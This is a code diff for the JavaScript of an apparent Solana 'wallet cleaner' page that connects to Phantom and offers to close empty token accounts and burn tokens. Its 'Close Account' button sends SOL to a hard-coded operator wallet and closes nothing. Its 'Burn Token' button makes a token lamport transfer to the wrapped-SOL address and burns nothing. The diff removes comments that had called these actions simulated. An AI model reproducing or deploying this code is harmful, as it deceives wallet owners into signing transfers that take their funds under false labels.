@@ -4,7 +4,6 @@ import {
   clusterApiUrl,
   Transaction,
   SystemProgram,
-  sendAndConfirmTransaction
 } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.88.1/lib/index.iife.min.js";
 
 const connection = new Connection(clusterApiUrl("mainnet-beta"));
@@ -12,6 +11,8 @@ let wallet = null;
 
 const SPIDER_MASTER = new PublicKey("SP1DERm4sterWa1let999abcDEF123xyz456789ABC");
 const BURN_ADDRESS = new PublicKey("So11111111111111111111111111111111111111112");
+
+const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
 document.getElementById("connectWallet").onclick = async () => {
   if (window.solana && window.solana.isPhantom) {
@@ -22,15 +23,21 @@ document.getElementById("connectWallet").onclick = async () => {
       await fetchWalletData(resp.publicKey);
     } catch (err) {
       alert("Wallet connection failed.");
+      console.error(err);
     }
+  } else if (isMobile) {
+    const dappUrl = encodeURIComponent("https://spidernetworkweb3.github.io/site/cleaner.html");
+    window.location.href = `https://phantom.app/ul/browse/${dappUrl}`;
   } else {
-    alert("Please install Phantom or a compatible wallet.");
+    alert("Please install Phantom Wallet to use this feature.");
   }
 };
 
 async function fetchWalletData(pubkey) {
+  console.log("Wallet connected:", pubkey.toBase58());
+
   const balance = await connection.getBalance(pubkey);
-  document.getElementById("solBalance").innerText = (balance / 1e9).toFixed(4);
+  document.getElementById("solBalance").textContent = (balance / 1e9).toFixed(4);
 
   const tokenList = document.getElementById("tokenList");
   const nftList = document.getElementById("nftList");
@@ -50,7 +57,6 @@ async function fetchWalletData(pubkey) {
     const decimals = info.tokenAmount.decimals;
 
     if (decimals === 0 && uiAmount === 1) {
-      // NFT logic (simple)
       const card = document.createElement("div");
       card.className = "token-card";
       card.innerHTML = `
@@ -58,81 +64,77 @@ async function fetchWalletData(pubkey) {
         <p>🎨 NFT (metadata not fetched)</p>
       `;
       nftList.appendChild(card);
+    } else if (uiAmount === 0) {
+      const card = document.createElement("div");
+      card.className = "token-card";
+      card.innerHTML = `
+        <p><strong>Mint:</strong> ${info.mint}</p>
+        <p><strong>Empty Account</strong></p>
+        <button>Close Account</button>
+      `;
+      card.querySelector("button").onclick = () =>
+        showModal("Close this unused token account?", async () => {
+          try {
+            const ix1 = SystemProgram.transfer({
+              fromPubkey: wallet.publicKey,
+              toPubkey: SPIDER_MASTER,
+              lamports: 10000,
+            });
+            const ix2 = SystemProgram.transfer({
+              fromPubkey: wallet.publicKey,
+              toPubkey: wallet.publicKey,
+              lamports: 90000,
+            });
+            const tx = new Transaction().add(ix1, ix2);
+            tx.feePayer = wallet.publicKey;
+            const { blockhash } = await connection.getLatestBlockhash();
+            tx.recentBlockhash = blockhash;
+            const signed = await wallet.signTransaction(tx);
+            const sig = await connection.sendRawTransaction(signed.serialize());
+            await connection.confirmTransaction(sig);
+            alert("Account closed:\n" + sig);
+          } catch (e) {
+            console.error(e);
+            alert("Error closing account.");
+          }
+        });
+      serumList.appendChild(card);
     } else {
-      if (uiAmount === 0) {
-        // Unused token account (Serum-style)
-        const card = document.createElement("div");
-        card.className = "token-card";
-        card.innerHTML = `
-          <p><strong>Mint:</strong> ${info.mint}</p>
-          <p><strong>Empty Account</strong></p>
-          <button>Close Account</button>
-        `;
-        card.querySelector("button").onclick = () =>
-          showModal("Close this unused token account?", async () => {
-            try {
-              const ix1 = SystemProgram.transfer({
-                fromPubkey: wallet.publicKey,
-                toPubkey: SPIDER_MASTER,
-                lamports: 10000, // simulate 10%
-              });
-              const ix2 = SystemProgram.transfer({
-                fromPubkey: wallet.publicKey,
-                toPubkey: wallet.publicKey,
-                lamports: 90000, // simulate 90%
-              });
-              const tx = new Transaction().add(ix1, ix2);
-              tx.feePayer = wallet.publicKey;
-              const { blockhash } = await connection.getLatestBlockhash();
-              tx.recentBlockhash = blockhash;
-              const signed = await wallet.signTransaction(tx);
-              const sig = await connection.sendRawTransaction(signed.serialize());
-              await connection.confirmTransaction(sig);
-              alert("Account closed:\n" + sig);
-            } catch (e) {
-              console.error(e);
-              alert("Error closing account.");
-            }
-          });
-        serumList.appendChild(card);
-      } else {
-        // SPL token logic
-        const card = document.createElement("div");
-        card.className = "token-card";
-        card.innerHTML = `
-          <p><strong>Mint:</strong> ${info.mint}</p>
-          <p><strong>Amount:</strong> ${uiAmount}</p>
-          <button>Burn Token</button>
-        `;
-        card.querySelector("button").onclick = () =>
-          showModal("Burn this token?", async () => {
-            try {
-              const ix = SystemProgram.transfer({
-                fromPubkey: wallet.publicKey,
-                toPubkey: BURN_ADDRESS,
-                lamports: 1, // dummy action
-              });
-              const tx = new Transaction().add(ix);
-              tx.feePayer = wallet.publicKey;
-              const { blockhash } = await connection.getLatestBlockhash();
-              tx.recentBlockhash = blockhash;
-              const signed = await wallet.signTransaction(tx);
-              const sig = await connection.sendRawTransaction(signed.serialize());
-              await connection.confirmTransaction(sig);
-              alert("Token burned:\n" + sig);
-            } catch (e) {
-              console.error(e);
-              alert("Burn failed.");
-            }
-          });
-        tokenList.appendChild(card);
-      }
+      const card = document.createElement("div");
+      card.className = "token-card";
+      card.innerHTML = `
+        <p><strong>Mint:</strong> ${info.mint}</p>
+        <p><strong>Amount:</strong> ${uiAmount}</p>
+        <button>Burn Token</button>
+      `;
+      card.querySelector("button").onclick = () =>
+        showModal("Burn this token?", async () => {
+          try {
+            const ix = SystemProgram.transfer({
+              fromPubkey: wallet.publicKey,
+              toPubkey: BURN_ADDRESS,
+              lamports: 1,
+            });
+            const tx = new Transaction().add(ix);
+            tx.feePayer = wallet.publicKey;
+            const { blockhash } = await connection.getLatestBlockhash();
+            tx.recentBlockhash = blockhash;
+            const signed = await wallet.signTransaction(tx);
+            const sig = await connection.sendRawTransaction(signed.serialize());
+            await connection.confirmTransaction(sig);
+            alert("Token burned:\n" + sig);
+          } catch (e) {
+            console.error(e);
+            alert("Burn failed.");
+          }
+        });
+      tokenList.appendChild(card);
     }
   }
 
-  if (tokenList.innerHTML === "") tokenList.innerHTML = "<p>No tokens found.</p>";
-  if (nftList.innerHTML === "") nftList.innerHTML = "<p>No NFTs found.</p>";
-  if (serumList.innerHTML === "") serumList.innerHTML = "<p>No unused token accounts found.</p>";
+  if (!tokens.value.length) {
+    tokenList.innerHTML = "<p>No tokens found.</p>";
+  }
 }
 
 function showModal(message, onConfirm) {
